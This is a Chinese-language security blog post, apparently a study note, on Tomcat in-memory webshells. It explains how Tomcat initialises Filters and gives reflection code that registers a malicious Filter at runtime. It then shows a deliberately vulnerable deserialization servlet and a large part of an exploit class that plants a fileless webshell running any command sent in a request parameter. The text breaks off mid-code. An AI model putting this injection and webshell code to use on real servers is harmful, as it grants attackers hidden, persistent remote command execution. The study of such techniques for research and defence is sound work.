@@ -1,0 +1,1285 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Tomcat内存马学习笔记 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Tomcat内存马学习笔记 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Filter内存马
+Filter初始化
+Tomcat在启动的时候会对Filter进行初始化，它会根据web.xml和servlet注解进行初始。这里面操作涉及了StandardContext中三个重要的成员变量：
+
+filterDefs
+f..." />
+    <meta name="keywords" content="内存马,JAVA" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Tomcat内存马学习笔记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-14
+              </span>
+              <span>
+                28 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/37Irvvniz/" class="post-tag">
+                  # 内存马
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/tomcat-nei-cun-ma-xue-xi-bi-ji.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="filter内存马">Filter内存马</h1>
+<h2 id="filter初始化">Filter初始化</h2>
+<p>Tomcat在启动的时候会对Filter进行初始化，它会根据web.xml和servlet注解进行初始。这里面操作涉及了<code>StandardContext</code>中三个重要的成员变量：</p>
+<ul>
+<li>filterDefs</li>
+<li>filterMaps</li>
+<li>filterConfigs</li>
+</ul>
+<p>启动的时候，先会调用<code>addFilterDef</code>和<code>addFilterMap</code>来将<code>filterDef</code>和<code>filterMap</code>加入到<code>filterDefs</code>和<code>filterMaps</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1702546009746.png" alt="" loading="lazy"></p>
+<p>最后在调用加载Filter的<code>filterStart()</code>时，会根据<code>filterDefs</code>来对<code>filterConfigs</code>进行初始<br>
+<img src="https://skyblu3519.github.io/post-images/1702546142548.png" alt="" loading="lazy"></p>
+<p><code>WsServerContainer</code> 是 Apache Tomcat 中实现 WebSocket 功能的一个类，它并不是通过在web.xml配置文件或通过注解直接初始化的。在初始化这个类的时候，会在<code>StandardContext</code>中再添加一个<code>Tomcat WebSocket (JSR356) Filter</code>，分析这个流程可以知道加载一个Filter的更多细节。</p>
+<p>首先，它会调用<code>ApplicationContext</code>中的<code>addFilter</code>方法，为<code>filterDefs</code>添加一个<code>filterDef</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1702546286495.png" alt="" loading="lazy"></p>
+<p>同时注意一个新建的FilterDef对象要做初始化的地方有三个部分</p>
+<ul>
+<li>setFilterName</li>
+<li>setFilterClass</li>
+<li>setFilter</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1702546472338.png" alt="" loading="lazy"></figure>
+<p>filterDefs是一个HashMap<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/5.png" alt="" loading="lazy"></p>
+<p>addFilterDef的工作方式<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/6.png" alt="" loading="lazy"></p>
+<p><code>addFilter</code>最后会返回一个<code>ApplicationFilterRegistration</code>对象，接着程序会调用<code>ApplicationFilterRegistration</code>下的<code>addMappingForUrlPatterns</code>来添加<code>filterMaps</code><br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/7.png" alt="" loading="lazy"></p>
+<p>与<code>addFilter</code>类似，<code>addMappingForUrlPatterns</code>中会初始化一个<code>filterMap</code>对象，然后将其添加到<code>filterMaps</code>中。初始一个<code>filterMap</code>对象会做三件事情：</p>
+<ul>
+<li>setFilterName</li>
+<li>setDispatcher：它是设置一个特定过滤器在何种情况下被调用
+<ul>
+<li>REQUEST：过滤器将仅在处理客户端的直接请求时被调用。</li>
+<li>FORWARD：当请求被一个servlet通过<code>RequestDispatcher.forward()</code>方法转发时，应用这个过滤器。</li>
+<li>INCLUDE：当请求被一个servlet通过<code>RequestDispatcher.include()</code>方法包含时，应用这个过滤器。</li>
+<li>ERROR：当请求是为了处理错误而调度时，应用这个过滤器。</li>
+<li>ASYNC：当请求是在Servlet的异步模式下操作时，应用这个过滤器。</li>
+</ul>
+</li>
+<li>addURLPattern</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/8.png" alt="" loading="lazy"></figure>
+<p>最后在<code>filterStart()</code>会对<code>filterConfigs</code>进行初始，主要根据<code>filterDefs</code>变量<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/9.png" alt="" loading="lazy"></p>
+<h2 id="filter工作方式">Filter工作方式</h2>
+<p>Tomcat 的Pipline/Valve和Container：</p>
+<ul>
+<li><a href="https://www.jianshu.com/p/c74d2df8bc8a">https://www.jianshu.com/p/c74d2df8bc8a</a></li>
+<li><a href="https://www.jianshu.com/p/1a2d2f868143">https://www.jianshu.com/p/1a2d2f868143</a></li>
+</ul>
+<p><code>StandardWrapperValve</code>是处理特定Servlet请求的最后一个<code>Valve</code>，负责将请求传递给具体的Servlet实例。其处理请求的核心代码如下：<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/10.png" alt="" loading="lazy"></p>
+<p>简而言之，如果一个请求是异步的（<code>request.isAsyncDispatching()</code>返回为true），那么就调用<code>request.getAsyncContextInternal().doInternalDispatch()</code>来处理，如果不是异步的就通过<code>filterChain</code>处理请求。<code>SwallowOutput</code>用于控制是否捕获和记录Servlet和过滤器执行期间写入到System.out和System.err的输出的设置。</p>
+<p>可以看到，每次请求的 FilterChain 都是动态匹配获取和生成的。调用的是<code>ApplicationFilterFactory</code>的<code>createFilterChain</code>方法，其添加的流程如下：</p>
+<ul>
+<li>在 context 中获取 filterMaps</li>
+<li>循环filterMaps，匹配请求的url</li>
+<li>如果匹配，则从filterConfigs中根据filterName选出对应的filterConfig加入filterChain</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/11.png" alt="" loading="lazy"></figure>
+<p>除了根据URL还会根据servlet name进行一次匹配<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/12.png" alt="" loading="lazy"></p>
+<p>之后调用filterChain.doFilter方法<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/13.png" alt="" loading="lazy"></p>
+<p><code>internalDoFilter</code>会循环 <code>filterChain</code> 中的全部 <code>filterConfig</code>，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 <code>doFilter</code> 方法。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/14.0.png" alt="" loading="lazy"></p>
+<h2 id="动态注册filter">动态注册Filter</h2>
+<h3 id="实验准备">实验准备</h3>
+<p>新建一个简单的servlet</p>
+<pre><code class="language-java">package com.example;
+
+import java.io.*;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.*;
+
+@WebServlet(&quot;/&quot;)
+public class HelloServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        response.setContentType(&quot;text/html&quot;);
+        PrintWriter out = response.getWriter();
+        out.println(&quot;&lt;p&gt;Hello World!&lt;/p&gt;&quot;);
+    }
+}
+</code></pre>
+<p>然后准备一个动态添加Filter的servlet，之后会在doGet方法中写我们动态注册Filter的代码，这里我们用它添加一个<code>simpleFilter</code>。准备的代码如下：</p>
+<pre><code class="language-java">package com.memshell.tomcat;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+@WebServlet(&quot;/addFilter&quot;)
+public class AddFilter extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+    	// 动态注册Filter的代码
+    }
+}
+
+// 需要注册的Filter
+class simpleFilter implements Filter {
+
+    public void init(FilterConfig filterConfig) {
+        // Filter 初始化时调用
+    }
+
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);
+        System.out.println(&quot;Filter 被调用&quot;);
+        chain.doFilter(request, response);
+    }
+
+    public void destroy() {
+        // Filter 销毁时调用
+    }
+}
+</code></pre>
+<p>根据上面的分析，动态注册一个Filter，就是修改ServletContext中的那三个成员变量：</p>
+<ul>
+<li>filterDefs</li>
+<li>filterMaps</li>
+<li>filterConfigs</li>
+</ul>
+<p>有两种思路</p>
+<ul>
+<li>参考<code>Tomcat WebSocket (JSR356) Filter</code>的注册方式，依次调用<code>ApplicationContext.addFilter</code>、<code>ApplicationFilterRegistration.addMappingForUrlPatterns</code>、<code>StandardContext.filterStart()</code>，来修改<code>filterDefs</code>、<code>filterMaps</code>、<code>filterConfigs</code>。</li>
+<li>直接用反射修改这三个变量。</li>
+</ul>
+<p>继续之前需要了解的：ServletContext、applicationContext、StandardContext和ApplicationContextFacade。详细的内容可以参考：</p>
+<ul>
+<li><a href="https://www.jianshu.com/p/1a2d2f868143">https://www.jianshu.com/p/1a2d2f868143</a></li>
+<li><a href="https://www.jianshu.com/p/2b6359daf5c8">https://www.jianshu.com/p/2b6359daf5c8</a></li>
+</ul>
+<p>这里说下个人浅薄的理解：</p>
+<ul>
+<li>ServletContext是servlet定义的一个接口、规范，它提供了与一个web应用运行相关的所有变量，把它想成一个web应用的上下文环境。</li>
+<li>ApplicationContext则是Tomcat对ServletContext接口的具体实现。</li>
+<li>ApplicationContextFacade则是对ApplicationContext的封装，之后通过<code>request.getServletContext()</code>获取到的其实是ApplicationContextFacade，它的context属性才是ApplicationContext。</li>
+<li>StandardContext又被ApplicationContext封装，ApplicationContext对ServletContext的一部分实现，其实是交给StandardContext来做的。在代码层面上，ApplicationContext的context属性就是StandardContext。</li>
+</ul>
+<pre><code>ApplicationContextFacade = request.getServletContext()
+ L context -&gt; ApplicationContext
+            	 L context -&gt; StandardContext
+</code></pre>
+<h3 id="方法一调用函数修改">方法一：调用函数修改</h3>
+<p><code>filterDefs</code>、<code>filterMaps</code>和<code>filterConfigs</code>都与<code>ApplicationContext</code>和<code>StandardContext</code>密切相关。首先是获取<code>ApplicationContext</code>和<code>StandardContext</code>的代码</p>
+<pre><code class="language-java">ServletContext servletContext = req.getServletContext();
+Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+f.setAccessible(true);
+ApplicationContext applicationContext = (ApplicationContext) f.get(servletContext);
+
+Field af = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+af.setAccessible(true);
+StandardContext standardContext = (StandardContext) af.get(applicationContext);
+</code></pre>
+<p>然后是添加<code>filterDefs</code>，调用的是<code>ApplicationContext.addFilter</code>。<code>addFilter</code>有四种实现，我们调用的是<code>addFilter(String filterName, Filter filter)</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/14.5.png" alt="" loading="lazy"></p>
+<p>另外，<code>addFilter</code>中的<code>checkState</code>会检查Tomcat的LifecycleState（与Lifecycle详见<a href="https://www.jianshu.com/p/2a9ffbd00724">https://www.jianshu.com/p/2a9ffbd00724</a>），所以调用之前修改<code>standardContext</code>的<code>state</code>属性。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/15.png" alt="" loading="lazy"></p>
+<p>具体代码如下：</p>
+<pre><code class="language-java">// 实例化要添加的Filter
+Filter sf = new simpleFilter();
+
+// 修改standardContext的LifecycleState
+java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
+        .getDeclaredField(&quot;state&quot;);
+stateField.setAccessible(true);
+stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+
+// 调用addFilter
+javax.servlet.FilterRegistration.Dynamic fr = applicationContext.addFilter(filterName, sf);
+
+//状态恢复
+stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+</code></pre>
+<p>执行<code>addFilter</code>之后同时得到了一个<code>ApplicationFilterRegistration</code>对象，然后就调用它的<code>addMappingForUrlPatterns</code>来添加<code>filterMap</code>。这里要注意的是，为了防止一些特殊情况（如shiro这种），我们添加的Filter要放到FilterChain的最前面。</p>
+<p>通过前面的分析，FilterChain的顺序只与<code>filterMaps</code>有关。现在细看下这个<code>filterMaps</code>，它其实是一个<code>ContextFilterMaps</code>对象，我们新建的<code>filterMap</code>最后是添加到它里面的<code>FilterMap[] array</code>中的。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/16.png" alt="" loading="lazy"></p>
+<p>添加的方式则是通过<code>ContextFilterMaps</code>的<code>add</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/17.png" alt="" loading="lazy"></p>
+<p>除此之外，<code>ContextFilterMaps</code>还提供了一个<code>addBefore</code>方法，来把<code>filterMap</code>添加到数组<code>array</code>的头部<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/18.png" alt="" loading="lazy"></p>
+<p>与它对应的是<code>StandardContext.addFilterMapBefore</code>，而在<code>addMappingForUrlPatterns</code>中要调用<code>addFilterMapBefore</code>来添加<code>filterMap</code>，则要传入参数<code>isMatchAfter</code>为<code>false</code><br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/19.png" alt="" loading="lazy"></p>
+<p>依照逻辑写出添加<code>filterMap</code>的代码</p>
+<pre><code class="language-java">fr.setAsyncSupported(false);
+fr.addMappingForUrlPatterns(
+        java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),
+        false,
+        new String[]{&quot;/*&quot;}
+);
+</code></pre>
+<p>最后，在Tomcat 8.5版本中，filterStart是一个public方法。所以直接调用即可，它就根据新的<code>filterDefs</code>来生成相应的<code>filterConfigs</code></p>
+<pre><code class="language-java">standardContext.filterStart();
+</code></pre>
+<p>最后完整的代码如下：</p>
+<pre><code class="language-java">package com.memshell.tomcat;
+
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+@WebServlet(&quot;/addFilter&quot;)
+public class AddFilter extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+
+        try {
+            String filterName = &quot;skkyFilter&quot;;
+            ServletContext servletContext = req.getServletContext();
+
+            if (servletContext.getFilterRegistration(filterName) == null) {
+                Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                f.setAccessible(true);
+                ApplicationContext applicationContext = (ApplicationContext) f.get(servletContext);
+
+                Field af = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+                af.setAccessible(true);
+                StandardContext standardContext = (StandardContext) af.get(applicationContext);
+
+                Filter sf = new simpleFilter();
+
+                //修改状态，要不然添加不了
+                java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
+                        .getDeclaredField(&quot;state&quot;);
+                stateField.setAccessible(true);
+                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+
+                javax.servlet.FilterRegistration.Dynamic fr = applicationContext.addFilter(filterName, sf);
+
+                //状态恢复
+                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+
+                fr.setAsyncSupported(false);
+                fr.addMappingForUrlPatterns(
+                        java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),
+                        false,
+                        new String[]{&quot;/*&quot;}
+                );
+
+
+                standardContext.filterStart();
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+class simpleFilter implements Filter {
+
+    public void init(FilterConfig filterConfig) {
+        // Filter 初始化时调用
+    }
+
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);
+        System.out.println(&quot;Filter 已添加&quot;);
+        chain.doFilter(request, response);
+    }
+
+    public void destroy() {
+        // Filter 销毁时调用
+    }
+}
+
+</code></pre>
+<p>现在，启动Tomcat，访问/addFilter<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/20.png" alt="" loading="lazy"></p>
+<p>新的Filter被成功添加<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/21.png" alt="" loading="lazy"></p>
+<h3 id="方法二反射修改">方法二：反射修改</h3>
+<p>参考：<a href="https://github.com/su18/MemoryShell/blob/main/memshell-test/memshell-test-tomcat/src/org/su18/memshell/test/tomcat/AddTomcatFilter.java">su18-AddTomcatFilter</a></p>
+<p>su18师傅的代码写的非常清楚，就不过多赘述了。完整代码：</p>
+<pre><code class="language-java">package com.memshell.tomcat;
+
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+@WebServlet(&quot;/addFilterReflect&quot;)
+public class AddFilterReflect extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+
+        try {
+
+            String filterName = &quot;skkyFilter&quot;;
+
+            // 从 request 中获取 servletContext
+            ServletContext servletContext = req.getServletContext();
+
+            // 如果已有此 filterName 的 Filter，则不再重复添加
+            if (servletContext.getFilterRegistration(filterName) == null) {
+
+                StandardContext o = null;
+
+                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+                while (o == null) {
+                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                    f.setAccessible(true);
+                    Object object = f.get(servletContext);
+
+                    if (object instanceof ServletContext) {
+                        servletContext = (ServletContext) object;
+                    } else if (object instanceof StandardContext) {
+                        o = (StandardContext) object;
+                    }
+                }
+
+                // 创建自定义 Filter 对象
+                Filter filterClass = new simpleFilter();
+
+                // 创建 FilterDef 对象
+                FilterDef filterDef = new FilterDef();
+                filterDef.setFilterName(filterName);
+                filterDef.setFilter(filterClass);
+                filterDef.setFilterClass(filterClass.getClass().getName());
+
+                // 创建 ApplicationFilterConfig 对象
+                Constructor&lt;?&gt;[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
+                constructor[0].setAccessible(true);
+                ApplicationFilterConfig config = (ApplicationFilterConfig) constructor[0].newInstance(o, filterDef);
+
+                // 创建 FilterMap 对象
+                FilterMap filterMap = new FilterMap();
+                filterMap.setFilterName(filterName);
+                filterMap.addURLPattern(&quot;*&quot;);
+                filterMap.setDispatcher(DispatcherType.REQUEST.name());
+
+
+                // 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
+                Field filterConfigsField = o.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+                filterConfigsField.setAccessible(true);
+                HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = (HashMap&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(o);
+                filterConfigs.put(filterName, config);
+
+                // 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
+                Field filterMapField = o.getClass().getDeclaredField(&quot;filterMaps&quot;);
+                filterMapField.setAccessible(true);
+                Object object = filterMapField.get(o);
+
+                Class cl = Class.forName(&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;);
+                // addBefore 将 filter 放在第一位
+                Method m = cl.getDeclaredMethod(&quot;addBefore&quot;, FilterMap.class);
+//				Method m = cl.getDeclaredMethod(&quot;add&quot;, FilterMap.class);
+                m.setAccessible(true);
+                m.invoke(object, filterMap);
+
+                PrintWriter writer = resp.getWriter();
+                writer.println(&quot;tomcat filter added&quot;);
+
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+    }
+}
+</code></pre>
+<h2 id="利用">利用</h2>
+<p>上面我们是直接在Tomcat加了一个Servlet来动态添加Filter，下面我们在一个有<code>commons-collections:commons-collections:3.2.1</code>的服务端中，利用反序列化任意代码执行打入Filter内存马。</p>
+<p>漏洞Servlet代码如下：</p>
+<pre><code class="language-java">package com.test;
+
+import org.apache.commons.codec.binary.Base64;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.ByteArrayInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.PrintWriter;
+
+@WebServlet(&quot;/test&quot;)
+public class demoTest extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        response.setContentType(&quot;text/html&quot;);
+        PrintWriter out = response.getWriter();
+        out.println(&quot;&lt;p&gt;Deserialized Test Page&lt;/p&gt;&quot;);
+    }
+
+    @Override
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        response.setContentType(&quot;text/html&quot;);
+        PrintWriter out = response.getWriter();
+
+        String inputBase64 = request.getParameter(&quot;input&quot;);
+        if (inputBase64 == null || inputBase64.isEmpty()) {
+            out.println(&quot;No input provided&quot;);
+            return;
+        }
+
+        try {
+            Object deserializedObject = deserializeFromBase64(inputBase64);
+
+            out.println(&quot;Deserialized object: &quot; + deserializedObject.toString());
+        } catch (ClassNotFoundException e) {
+            out.println(&quot;Error during deserialization: &quot; + e.getMessage());
+        }
+    }
+
+    public static Object deserializeFromBase64(String base64String) throws IOException, ClassNotFoundException {
+        byte[] data = Base64.decodeBase64(base64String);
+        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
+             ObjectInputStream ois = new ObjectInputStream(bais)) {
+
+            return ois.readObject();
+        }
+    }
+}
+
+
+</code></pre>
+<p>编译命令：</p>
+<pre><code>javac -cp &quot;/xxx/xxx/xxx/apache-tomcat-8.5.96/lib/*&quot; tomcatServletExploit.java
+</code></pre>
+<p>在上面的动态注册Filter代码中，最关键的就是<code>ServletContext</code>的获取，而获得<code>ServletContext</code>一个思路是拿到当前请求<code>HttpServletRequest</code>对象。这里参考的是：<a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a>。</p>
+<p>文章提到了一种通过初始化<code>lastServicedRequest</code>来获取当前请求的<code>HttpServletRequest</code>对象的方法。在<code>internalDoFilter</code>中，如果<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true的话，那么在调用<code>servlet.service(request, response)</code>处理请求之前，就会用<code>lastServicedRequest</code>和<code>lastServicedResponse</code>来对当前的<code>request</code>和<code>response</code>保存。<br>
+<img src="https://skyblu3519.github.io/post-images/Tomcat_memshell/22.png" alt="" loading="lazy"></p>
+<p>但是Tomcat启动时<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>、<code>lastServicedRequest</code>和<code>lastServicedResponse</code>被初始为false、null和null，所以思路就是：第一次请求用反射修改这三个变量，第二次请求从<code>lastServicedRequest</code>和<code>lastServicedResponse</code>获取当前请求的<code>request</code>和<code>response</code>。</p>
+<p>另外，这里还有一个反射修改final修饰的属性值的技巧，参见：<a href="https://www.jianshu.com/p/2d490b0155ad">https://www.jianshu.com/p/2d490b0155ad</a>。获取到<code>request</code>之后，就可以用前面的方法注册我们的Filter了。参考了文章<a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a>的写法，完整代码如下：</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+public class tomcatFilterExploit extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Filter {
+    static {
+        try {
+            Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);
+
+            Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);
+
+            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+            lastServicedRequestField.setAccessible(true);
+            lastServicedResponseField.setAccessible(true);
+
+            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);
+            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);
+            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+
+            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());
+                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());
+                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+            } else {
+                ServletRequest responseFacade = lastServicedRequest.get();
+                addFilter((HttpServletRequest) responseFacade);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+    public void init(FilterConfig filterConfig) {
+        // Filter 初始化时调用
+    }
+
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        System.out.println(
+                &quot;TomcatShellInject doFilter.....................................................................&quot;);
+        String cmd;
+        if ((cmd = request.getParameter(&quot;skky&quot;)) != null) {
+            Process process = Runtime.getRuntime().exec(cmd);
+            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                    new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                stringBuilder.append(line + '\n');
+            }
+            response.getOutputStream().write(stringBuilder.toString().getBytes());
+            response.getOutputStream().flush();
+            response.getOutputStream().close();
+            return;
+        }
+        chain.doFilter(request, response);
+    }
+
+
+    public void destroy() {
+        // Filter 销毁时调用
+    }
+
+    static void addFilter(HttpServletRequest req) {
+
+        try {
+            String filterName = &quot;skkyFilter&quot;;
+            ServletContext servletContext = req.getServletContext();
+
+            if (servletContext.getFilterRegistration(filterName) == null) {
+                Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                f.setAccessible(true);
+                ApplicationContext applicationContext = (ApplicationContext) f.get(servletContext);
+
+                Field af = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+                af.setAccessible(true);
+                StandardContext standardContext = (StandardContext) af.get(applicationContext);
+
+                Filter sf = new tomcatFilterExploit();
+
+                //修改状态，要不然添加不了
+                java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
+                        .getDeclaredField(&quot;state&quot;);
+                stateField.setAccessible(true);
